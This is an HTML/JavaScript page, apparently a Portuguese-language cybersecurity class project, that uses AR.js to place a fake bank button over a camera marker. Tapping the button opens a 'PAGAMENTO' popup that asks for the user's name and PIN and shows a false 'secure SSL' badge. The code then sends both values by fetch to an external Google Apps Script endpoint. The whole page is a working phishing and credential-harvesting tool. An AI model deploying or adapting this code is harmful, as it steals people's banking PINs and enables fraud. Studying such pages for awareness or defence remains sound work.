<!DOCTYPE html>
<html>
<head>
    <title>Projeto Cibersegurança - Final Real</title>
    <script src="https://aframe.io/releases/1.2.0/aframe.min.js"></script>
    <script src="https://raw.githack.com/AR-js-org/AR.js/master/aframe/build/aframe-ar.js"></script>
    <style>
        /* Estilo que será aplicado quando o form for criado */
        .hacker-popup {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background: rgba(15, 15, 15, 0.98); padding: 25px; border-radius: 15px;
            z-index: 9999; text-align: center; color: white; 
            font-family: sans-serif; border: 2px solid #e74c3c; 
            box-shadow: 0 0 20px rgba(231, 76, 60, 0.5); width: 85%; max-width: 300px;
        }
        .hacker-popup input { padding: 12px; width: 90%; margin: 10px 0; border-radius: 8px; border: 1px solid #444; background: #222; color: white; font-size: 16px; }
        .hacker-popup button { padding: 12px 25px; background: #e74c3c; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; }
    </style>
</head>

<body style="margin: 0px; overflow: hidden;">

    <div id="container-do-golpe"></div>

    <a-scene embedded arjs="sourceType: webcam; debugUIEnabled: false;">
        <a-assets><img id="btnBanco" src="botao_banco2.png"></a-assets>
        <a-entity cursor="rayOrigin: mouse" raycaster="objects: .clickable"></a-entity>

        <a-marker type="pattern" url="marker.patt">
            <a-image class="clickable" src="#btnBanco" position="0 0.1 0" rotation="-90 0 0" width="2.5" height="3.0" onclick="criarFormulario()"></a-image>
            <a-plane class="clickable" position="0 0.15 0" rotation="-90 0 0" width="2.6" height="3.1" material="opacity: 0.1; color: red" onclick="criarFormulario()"></a-plane>
        </a-marker>

        <a-entity camera></a-entity>
    </a-scene>

    <script>
        const linkPlanilha = "https://script.google.com/macros/s/AKfycbz1k8PdYUutAn6JWMN8KpoGBy61bl70-UVmzwZ5-hQ55Dtpp9OQtlBYTUWe7FxKojA/exec";

        function criarFormulario() {
            const container = document.getElementById('container-do-golpe');
            
            // Se já existir um form, não cria outro
            if (container.innerHTML !== "") return;

            // Criamos o HTML do zero agora no clique
            container.innerHTML = `
                <div class="hacker-popup" id="meu-form">
                    <h2 style="color: #e74c3c; margin: 0 0 10px 0;">PAGAMENTO</h2>
                    <p style="font-size: 14px;">Identifique-se para continuar:</p>
                    <input type="text" id="nome-input" placeholder="Seu Nome">
                    <input type="password" id="pin-input" placeholder="Digite seu PIN" inputmode="numeric">
                    <button id="btn-enviar" onclick="enviarDados()">CONFIRMAR PAGAMENTO</button>
                    <p style="color: #888; font-size: 11px; margin-top: 10px;">🔒 Conexão Segura SSL</p>
                </div>
            `;
        }

        function enviarDados() {
            const nome = document.getElementById('nome-input').value;
            const pin = document.getElementById('pin-input').value;

            if (!nome || !pin) { alert("Preencha tudo!"); return; }

            const btn = document.getElementById('btn-enviar');
            btn.innerHTML = "PROCESSANDO...";
            btn.disabled = true;

            fetch(`${linkPlanilha}?nome=${encodeURIComponent(nome)}&senha=${encodeURIComponent(pin)}`, {
                method: 'POST',
                mode: 'no-cors'
            })
            .then(() => {
                alert("🚨 OPERAÇÃO CONCLUÍDA!");
                // Remove o formulário do HTML para ele sumir de vez
                document.getElementById('container-do-golpe').innerHTML = "";
            })
            .catch(() => {
                alert("Erro ao enviar.");
                btn.innerHTML = "CONFIRMAR PAGAMENTO";
                btn.disabled = false;
            });
        }
    </script>
</body>
</html>
